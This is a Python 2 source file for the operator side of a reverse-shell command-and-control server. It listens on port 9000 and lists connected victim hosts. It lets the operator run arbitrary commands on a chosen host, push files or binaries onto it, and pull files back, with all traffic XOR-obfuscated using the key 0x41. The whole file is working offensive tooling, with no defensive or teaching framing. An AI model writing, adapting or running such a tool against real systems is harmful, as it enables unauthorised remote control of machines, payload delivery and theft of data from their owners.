#!/usr/bin/python

import socket
from thread import *
import sys
from time import sleep

def conn_accept(sock,handler):
    while True:
        (client, (ip,port)) = sock.accept()
        handler.add_host(client,(ip,port))

def send_comm(command, cur_host_con):
    encode = bytearray(command)
    for i in range(len(encode)):
        encode[i] ^=0x41
    try:
        cur_host_con.send(encode)
        return 0
    except:
        return 1

def recv_comm(recv_size,cur_host_con):
    en_data = cur_host_con.recv(recv_size)
    decode = bytearray(en_data)
    for i in range(len(decode)):
        decode[i] ^=0x41
    return decode

def list_root_commands():
    print ("List of Server Commands")
    print ("$List_Commands -> Display this list")
    print ("$List_Hosts -> Display connected hosts")
    print ("$Choose_Host host_no -> Select host from list")
    print ("$Exit -> Exit this program")

def list_connected_commands():
    print ("List of Commands when Host is Selected")
    print ("$List_Commands -> Display this list")
    print ("$Make_File localFileName (remoteFileName)-> Create remote file")
    print ("$Make_Binary localBinaryName (remoteBinaryName)-> Create remote binary")
    print ("$Pull_File remoteFileName (localFileName)-> Get remote file")
    print ("$Pull_Binary remoteBinaryName (localBinaryName)-> Get remote binary")
    print ("$Close_Connection -> Close Connection and remove host")
    print ("$Exit -> Exit to the main interface")

class rev_shell_client_main():
    list_of_hosts = []
    def __init__(self):
        self.list_of_hosts = []

    def add_host(self, host, tup):
        self.list_of_hosts.append([host,tup])

    def remove_host(self, host_id):
        self.list_of_hosts.remove(self.list_of_hosts[host_id])

    def return_list_of_hosts(self):
        return self.list_of_hosts

#Start Here!
try:
    max_conns = int(sys.argv[1])
except:
    max_conns = 5

command_dict = {"List_Commands":0,"List_Hosts":1,"Choose_Host":2,"Exit":3}
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(("0.0.0.0",9000))
s.listen(max_conns)

handler = rev_shell_client_main()
start_new_thread(conn_accept,(s,handler))

list_root_commands()
while True:
    comm_body = ""
    comm_args = []
    cur_host_ip = ""
    cur_host_id = 0
    command = raw_input("~$ ")
    command = command.split(" ")
    comm_body = command[0]

    #Future Commands may require more than one args
    for i in range(1,len(command)):
        comm_args.append(command[i])
    try:
        translated = command_dict[comm_body]
    except:
        print ("Command not recognised! Try List_Commands for help")
        continue
    if translated == 0:
        list_root_commands()
    elif translated == 1:
        active_hosts = handler.return_list_of_hosts()
        for i in range(len(active_hosts)):
            print ("["+str(i)+"] "+active_hosts[i][1][0]+":"+str(active_hosts[i][1][1]))
    elif translated == 2:
        try:
            cur_host_id = int(comm_args[0])
        except:
            print ("Argument missing or not int")
            continue
        active_hosts = handler.return_list_of_hosts()
        try:
            cur_host_ip = active_hosts[cur_host_id][1][0]
            cur_host_con = active_hosts[cur_host_id][0]
        except:
            print ("Host ID out of bounds")
            continue
        list_connected_commands()
        while True:
            command = raw_input("["+cur_host_ip+"]~$ ")
            command = command.split(" ")
            comm_body = command[0]
            if comm_body == "List_Commands":
                list_connected_commands()
            elif comm_body == "Make_File":
                try:
                    fileToRead = open(command[1],'r')
                except:
                    print ("Local file not provided or not present")
                    continue
                try:
                    remoteFileName = command[2]
                except:
                    remoteFileName = command[1]
                res = send_comm('getFile',cur_host_con)
                if res == 1:
                    print ("Connection closed by client")
                    handler.remove_host(cur_host_id)
                    break
                res = send_comm(remoteFileName,cur_host_con)
                if res == 1:
                    print ("Connection closed by client")
                    handler.remove_host(cur_host_id)
                    break
                decode = recv_comm(1024,cur_host_con)
                if decode == "fna":
                    print ("Access Denied")
                    continue
                else:
                    command = fileToRead.read()
                    fileToRead.close()
                    fSize = len(command) + 1024
                    fSize = str(fSize)
                    res = send_comm(fSize, cur_host_con)
                    if res == 1:
                        print ("Connection closed by client")
                        handler.remove_host(cur_host_id)
                        break
                    res = send_comm(command,cur_host_con)
                    if res == 1:
                        print ("Connection closed by client")
                        handler.remove_host(cur_host_id)
                        break
                    decode = recv_comm(1024,cur_host_con)
            elif comm_body == "Make_Binary":
                try:
                    binToRead = open(command[1],'rb')
                except:
                    print ("Local binary not provided or not present")
                    continue
                try:
                    remoteBinName = command[2]
                except:
                    remoteBinName = command[1]
                res = send_comm('getBinary',cur_host_con)
                if res == 1:
                    print ("Connection closed by client")
                    handler.remove_host(cur_host_id)
                    break
                res = send_comm(remoteBinName,cur_host_con)
                if res == 1:
                    print ("Connection closed by client")
                    handler.remove_host(cur_host_id)
                    break
                decode = recv_comm(1024,cur_host_con)
                if decode == "fna":
                    print ("Access Denied")
                    continue
                else:
                    command = binToRead.read()
                    binToRead.close()
                    bSize = len(command) + 1024
                    bSize = str(bSize)
                    res = send_comm(bSize,cur_host_con)
                    sleep(0.1)
                    if res == 1:
                        print ("Connection closed by client")
                        handler.remove_host(cur_host_id)
                        break
                    res = send_comm(command,cur_host_con)
                    if res == 1:
                        print ("Connection closed by client")
                        handler.remove_host(cur_host_id)
                        break
                    decode = recv_comm(3072,cur_host_con)
            elif comm_body == "Pull_File":
                try:
                    remoteFileName = command[1]
                except:
                    print ("Remote file name not provided")
                    continue
                res = send_comm('sendFile',cur_host_con)
                if res == 1:
                    print ("Connection closed by client")
                    handler.remove_host(cur_host_id)
                    break
                res = send_comm(remoteFileName,cur_host_con)
                if res == 1:
                    print ("Connection closed by client")
                    handler.remove_host(cur_host_id)
                    break
                decode = recv_comm(1024,cur_host_con)
                if decode == 'fna':
                    print ("File does not exist or Access Denied")
                    continue
                else:
                    try:
                        localFileName = command[2]
                    except:
                        localFileName = command[1]
                    try:
                        localFile = open(localFileName,'w')
                    except:
                        print ("Cannot create local file")
                        continue
                    decode = recv_comm(1024,cur_host_con)
                    decode = recv_comm(int(decode),cur_host_con)
                    localFile.write(decode)
                    localFile.close()
            elif comm_body == "Pull_Binary":
                try:
                    remoteBinName = command[1]
                except:
                    print ("Remote binary name not provided")
                    continue
                res = send_comm('sendBinary',cur_host_con)
                if res == 1:
                    print ("Connection closed by client")
                    handler.remove_host(cur_host_id)
                    break
                res = send_comm(remoteBinName,cur_host_con)
                if res == 1:
                    print ("Connection closed by client")
                    handler.remove_host(cur_host_id)
                    break
                decode = recv_comm(1024,cur_host_con)
                if decode == 'fna':
                    print ("File does not exist or Access Denied")
                    continue
                else:
                    try:
                        localBinName = command[2]
                    except:
                        localBinName = command[1]
                    try:
                        localBin = open(localBinName,'wb')
                    except:
                        print ("Cannot create local file")
                        continue
                    decode = recv_comm(1024,cur_host_con)
                    decode = recv_comm(int(decode),cur_host_con)
                    localBin.write(decode)
                    localBin.close()
            elif comm_body == "Close_Connection":
                cur_host_con.close()
                handler.remove_host(cur_host_id)
                break
            elif comm_body == "Exit":
                break
            else:
                com_reconst = command
                command = ''
                for part in com_reconst:
                    command += part + " "
                command = command[:len(command)-1]
                encode = bytearray(command)
                for i in range(len(encode)):
                    encode[i] ^=0x41
                try:
                    cur_host_con.send(encode)
                    en_data = cur_host_con.recv(3072)
                    decode = bytearray(en_data)
                    for i in range(len(decode)):
                        decode[i] ^=0x41
                    print (decode)
                except:
                    print ("Connection closed by client")
                    handler.remove_host(cur_host_id)
                    break
    elif translated == 3:
        sys.exit()
    

